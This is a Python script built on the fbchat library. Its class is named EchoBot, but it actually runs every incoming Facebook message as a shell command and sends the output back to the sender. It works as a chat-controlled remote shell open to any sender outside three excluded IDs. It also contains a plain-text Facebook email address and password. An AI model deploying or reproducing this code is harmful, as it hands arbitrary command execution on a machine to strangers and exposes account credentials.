# -*- coding: utf-8 -*- 
from fbchat import log, Client
from fbchat.models import *
import time
import fbchat
import re
import logging
import sys
import importlib
import os
import subprocess
from subprocess import call
importlib.reload(sys)

#logging.basicConfig(level=logging.DEBUG)
class EchoBot(Client):
	def onMessage(self, author_id, message_object, thread_id, thread_type, **kwargs):
		self.markAsDelivered(thread_id, message_object.uid)
		self.markAsRead(thread_id)

		log.info("{} from {} in {}".format(message_object, thread_id, thread_type.name))

		# List of id to be exxcluded
		exclude_id = ["100066189990933", "100012310425942", "100020916321212"]
		if not author_id in exclude_id:

			if message_object.text == "Remove me!" and thread_type == ThreadType.GROUP:
				log.info("{} will be removed from {}".format(author_id, thread_id))
				self.removeUserFromGroup(author_id, thread_id=thread_id)
			else:        	

				replymess = message_object.text
				try:
					if "cd" not in replymess:
						arr = replymess.split(" ")
						process = subprocess.Popen(replymess , stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
						stdout, stderr = process.communicate()
						replymess = stdout.decode('utf-8') 
					else:
						replymess =  replymess.split(" ",1)[1] 
						os.chdir(replymess)
						process = subprocess.Popen("pwd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
						stdout, stderr = process.communicate()
						replymess = stdout.decode('utf-8')
					self.send(Message(text=replymess), thread_id=thread_id, thread_type=thread_type)
				except:
					self.send(message_object, thread_id=thread_id, thread_type=thread_type)

	
client = EchoBot('cut3best1234@gmail.com', 'Nganoccho1')
#print("Own id: {}".format(client.uid))
#thread_id = "100009271432830"

client.listen()

client.logout()
